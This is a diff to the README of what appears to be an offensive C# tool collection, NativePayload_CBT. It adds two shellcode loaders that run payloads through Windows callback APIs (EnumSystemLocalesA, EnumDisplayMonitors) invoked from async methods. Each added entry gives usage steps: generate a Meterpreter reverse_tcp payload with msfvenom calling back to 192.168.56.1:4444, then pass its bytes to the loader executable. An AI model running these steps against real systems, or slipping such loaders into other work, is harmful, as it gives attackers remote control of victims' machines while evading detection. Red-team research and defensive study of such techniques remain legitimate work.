@@ -30,7 +30,9 @@ C# Codes: "New C# codes for Callback Functions will publish here soon..."
     13. NativePayload_EnumSystemCodePagesA.cs  (by ChaitanyaHaritash)
     14. NativePayload_EnumSystemLocalesA.cs  (by ChaitanyaHaritash)
     15. NativePayload_EnumUILanguagesA.cs  (by ChaitanyaHaritash)
-    16. NativePayload_AsyncMethodEUILA.cs (Async C# Method + EnumUILanguagesA)
+    16. NativePayload_AsyncMethodEUILA.cs  (Async C# Method + EnumUILanguagesA)
+    17. NativePayload_AsyncMEnumSystemLocalesA.cs  (Async C# Method + EnumSystemLocalesA)
+    18. NativePayload_AsyncMEnumDisplayMonitors.cs  (Async C# Method + EnumDisplayMonitors)
 
 --------------------------------------------
    NativePayload_CBT.cs (Some of Callback Function Codes/Techniques in one code)
@@ -222,6 +224,32 @@ usage:
     example: NativePayload_AsyncMethodEUILA.exe "fc,48,00,87,00,...."
 
    ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_AsyncMethodEUILA.png)
+   
+ --------------------------------------------   
+   17. NativePayload_AsyncMEnumSystemLocalesA.cs (Callback Functions Technique via EnumSystemLocalesA API + Async Csharp Method)
+   
+   Note: it means we can use Callback Native API functions to Invoke C# Codes/Methods (like async call) etc.
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_AsyncMEnumSystemLocalesA.exe  [payload...]
+    example: NativePayload_AsyncMEnumSystemLocalesA.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_AsyncMEnumSystemLocalesA.png)
+   
+ --------------------------------------------   
+   18. NativePayload_AsyncMEnumDisplayMonitors.cs (Callback Functions Technique via EnumDisplayMonitors API + Async Csharp Method)
+   
+   Note: it means we can use Callback Native API functions to Invoke C# Codes/Methods (like async call) etc.
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_AsyncMEnumDisplayMonitors.exe  [payload...]
+    example: NativePayload_AsyncMEnumDisplayMonitors.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_ASyncMEnumDisplayMonitors.png)
    
  --------------------------------------------   
     
